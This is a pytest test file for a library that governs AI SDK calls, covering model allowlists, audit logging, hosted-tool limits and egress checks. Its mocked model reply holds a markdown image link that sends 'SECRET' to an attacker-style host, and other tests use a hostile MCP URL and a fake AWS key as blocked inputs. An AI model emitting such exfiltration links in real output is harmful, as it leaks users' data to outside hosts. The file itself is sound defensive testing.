"""Entry-point coverage for marshal_ai.integrations, driven through the
*real* openai/anthropic clients over an httpx.MockTransport — the SDK's
own request building, response parsing and streaming code all run; only
the network is replaced. These are the paths a `create()`-only patch
used to miss: the Responses API, `parse()`, and `stream()`."""

import json

import httpx
import pytest

import marshal_ai.integrations as marshal_integrations
from marshal_ai import (
    AllowlistModelPolicy,
    InMemoryAuditSink,
    ModelCallDenied,
    ModelCandidate,
    ModelGuard,
    Principal,
)
from marshal_ai.egress import EgressAllowlist


@pytest.fixture(autouse=True)
def cleanup_patches():
    yield
    marshal_integrations.disable_all()


def _guard(sink=None):
    policy = AllowlistModelPolicy({"chat": [ModelCandidate("gpt-real")], "claude": [ModelCandidate("claude-real")]})
    return ModelGuard(policy=policy, audit_sink=sink if sink is not None else InMemoryAuditSink())


RESPONSE_JSON = {
    "id": "resp_1", "object": "response", "created_at": 0, "model": "gpt-real", "status": "completed",
    "parallel_tool_calls": True, "tool_choice": "auto", "tools": [],
    "output": [{
        "type": "message", "id": "msg_1", "status": "completed", "role": "assistant",
        "content": [{"type": "output_text", "annotations": [],
                     "text": "Done. ![chart](https://evil.example/pixel.png?d=SECRET)"}],
    }],
    "usage": {"input_tokens": 11, "output_tokens": 7, "total_tokens": 18,
              "input_tokens_details": {"cached_tokens": 0}, "output_tokens_details": {"reasoning_tokens": 0}},
}


def _openai_client(seen: list):
    import openai

    def handler(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content or b"{}")
        seen.append((request.url.path, body))
        if body.get("stream"):
            created = {"type": "response.created", "sequence_number": 0,
                       "response": {**RESPONSE_JSON, "status": "in_progress", "output": []}}
            completed = {"type": "response.completed", "sequence_number": 1, "response": RESPONSE_JSON}
            sse = "".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n" for e in (created, completed))
            return httpx.Response(200, text=sse, headers={"content-type": "text/event-stream"})
        return httpx.Response(200, json=RESPONSE_JSON)

    return openai.OpenAI(api_key="sk-test", http_client=httpx.Client(transport=httpx.MockTransport(handler)))


def test_responses_create_is_governed_and_usage_reported():
    seen, sink = [], InMemoryAuditSink()
    guard = _guard(sink)
    marshal_integrations.enable_openai(guard, Principal(id="alice"))

    response = _openai_client(seen).responses.create(model="chat", input="hi")
    assert seen[0][0].endswith("/responses")
    assert seen[0][1]["model"] == "gpt-real"  # resolved before the request was built
    assert response.output_text.startswith("Done.")
    kinds = [e.to_dict()["kind"] for e in sink.all_entries()]
    assert kinds == ["model_call", "model_outcome", "model_usage"]
    usage = sink.all_entries()[-1]
    assert (usage.prompt_tokens, usage.completion_tokens) == (11, 7)


def test_responses_denied_model_never_sends_a_request():
    seen = []
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"))
    with pytest.raises(ModelCallDenied):
        _openai_client(seen).responses.create(model="unrouted", input="hi")
    assert seen == []


def test_responses_stream_was_a_bypass_and_is_now_governed():
    seen = []
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"))
    client = _openai_client(seen)
    with pytest.raises(ModelCallDenied):
        client.responses.stream(model="unrouted", input="hi")
    assert seen == []

    with client.responses.stream(model="chat", input="hi") as stream:
        final = stream.get_final_response()
    assert seen[0][1]["model"] == "gpt-real"
    assert final.output_text.startswith("Done.")


def test_chat_completions_stream_is_governed_too():
    seen = []
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"))
    with pytest.raises(ModelCallDenied):
        _openai_client(seen).chat.completions.stream(model="unrouted", messages=[{"role": "user", "content": "x"}])
    assert seen == []


def test_responses_prompt_scan_covers_instructions_and_tool_outputs():
    from marshal_ai.sensitive import SensitiveDataScanner

    seen = []
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"), scanner=SensitiveDataScanner())
    leaked_tool_output = [{"type": "function_call_output", "call_id": "c1", "output": "key=AKIAABCDEFGHIJKLMNOP"}]
    with pytest.raises(ModelCallDenied, match="AWS_ACCESS_KEY_ID"):
        _openai_client(seen).responses.create(model="chat", input=leaked_tool_output)
    assert seen == []


def test_hosted_tools_outside_the_allowlist_are_refused_before_sending():
    seen, sink = [], InMemoryAuditSink()
    marshal_integrations.enable_openai(_guard(sink), Principal(id="alice"), hosted_tools={"web_search"})
    client = _openai_client(seen)

    client.responses.create(model="chat", input="hi", tools=[{"type": "web_search"}])
    assert len(seen) == 1

    with pytest.raises(ModelCallDenied, match="code_interpreter"):
        client.responses.create(
            model="chat", input="hi", tools=[{"type": "code_interpreter", "container": {"type": "auto"}}]
        )
    assert len(seen) == 1
    assert sink.all_entries()[-1].outcome == "deny"


def test_client_side_function_tools_are_never_treated_as_hosted():
    seen = []
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"), hosted_tools=set())
    _openai_client(seen).responses.create(
        model="chat", input="hi",
        tools=[{"type": "function", "name": "lookup", "parameters": {"type": "object", "properties": {}}}],
    )
    assert len(seen) == 1


def test_hosted_mcp_server_must_be_on_the_egress_allowlist():
    seen = []
    egress = EgressAllowlist(["mcp.internal.example"])
    marshal_integrations.enable_openai(
        _guard(), Principal(id="alice"), hosted_tools={"mcp"}, egress_allowlist=egress
    )
    client = _openai_client(seen)
    with pytest.raises(ModelCallDenied, match="evil.example"):
        client.responses.create(
            model="chat", input="hi",
            tools=[{"type": "mcp", "server_label": "x", "server_url": "https://evil.example/mcp"}],
        )
    assert seen == []


def test_completion_links_to_other_hosts_are_audited():
    seen, sink = [], InMemoryAuditSink()
    egress = EgressAllowlist(["docs.example.com"])
    marshal_integrations.enable_openai(_guard(sink), Principal(id="alice"), egress_allowlist=egress)
    _openai_client(seen).responses.create(model="chat", input="hi")
    egress_entries = [e for e in sink.all_entries() if e.to_dict()["kind"] == "egress"]
    assert egress_entries and egress_entries[0].hosts == ["evil.example:1"]
    assert "SECRET" not in json.dumps(egress_entries[0].to_dict())  # host only, never the query string


def _anthropic_client(seen: list):
    import anthropic
    import httpx2  # anthropic 2.x ships on httpx2, and rejects an httpx client

    message = {
        "id": "msg_1", "type": "message", "role": "assistant", "model": "claude-real",
        "content": [{"type": "text", "text": "ok"}], "stop_reason": "end_turn", "stop_sequence": None,
        "usage": {"input_tokens": 5, "output_tokens": 2},
    }

    def handler(request):
        seen.append(json.loads(request.content or b"{}"))
        return httpx2.Response(200, json=message)

    return anthropic.Anthropic(api_key="sk-ant-test", http_client=httpx2.Client(transport=httpx2.MockTransport(handler)))


def test_anthropic_server_tools_are_governed_by_undated_name():
    seen = []
    marshal_integrations.enable_anthropic(_guard(), Principal(id="alice"), hosted_tools={"web_search"})
    client = _anthropic_client(seen)
    client.messages.create(
        model="claude", max_tokens=10, messages=[{"role": "user", "content": "hi"}],
        tools=[{"type": "web_search_20250305", "name": "web_search"}],
    )
    assert seen[0]["model"] == "claude-real"
    with pytest.raises(ModelCallDenied, match="code_execution"):
        client.messages.create(
            model="claude", max_tokens=10, messages=[{"role": "user", "content": "hi"}],
            tools=[{"type": "code_execution_20250825", "name": "code_execution"}],
        )
    assert len(seen) == 1


def test_anthropic_beta_messages_are_patched():
    seen = []
    marshal_integrations.enable_anthropic(_guard(), Principal(id="alice"))
    with pytest.raises(ModelCallDenied):
        _anthropic_client(seen).beta.messages.create(
            model="unrouted", max_tokens=10, messages=[{"role": "user", "content": "hi"}]
        )
    assert seen == []


def test_patched_methods_lists_every_entry_point_and_enable_is_idempotent():
    guard, alice = _guard(), Principal(id="alice")
    marshal_integrations.enable(guard, alice)
    marshal_integrations.enable(guard, alice)  # must not double-wrap
    methods = marshal_integrations.patched_methods()
    for expected in (
        "openai.resources.responses.responses.Responses.create",
        "openai.resources.responses.responses.AsyncResponses.stream",
        "openai.resources.chat.completions.completions.Completions.parse",
        "anthropic.resources.beta.messages.messages.Messages.stream",
        "google.genai.models.AsyncModels.generate_content_stream",
    ):
        assert expected in methods
    assert len(methods) == 28  # openai 12, anthropic 12 (incl. beta), google 4

    seen, sink = [], guard.audit_log
    _openai_client(seen).responses.create(model="chat", input="hi")
    assert [e.to_dict()["kind"] for e in sink.all_entries()].count("model_call") == 1


def test_a_new_call_made_inside_a_stream_consumer_is_still_governed():
    seen = []
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"))
    client = _openai_client(seen)
    with client.responses.stream(model="chat", input="hi") as stream:
        stream.get_final_response()
        # A fresh user call while the stream is open is not the SDK's own
        # internal call — it must still be governed.
        with pytest.raises(ModelCallDenied):
            client.responses.create(model="unrouted", input="again")


def test_disable_all_restores_the_original_methods():
    from openai.resources.responses.responses import Responses

    original = Responses.__dict__["create"]
    marshal_integrations.enable_openai(_guard(), Principal(id="alice"))
    assert Responses.__dict__["create"] is not original
    marshal_integrations.disable_all()
    assert Responses.__dict__["create"] is original
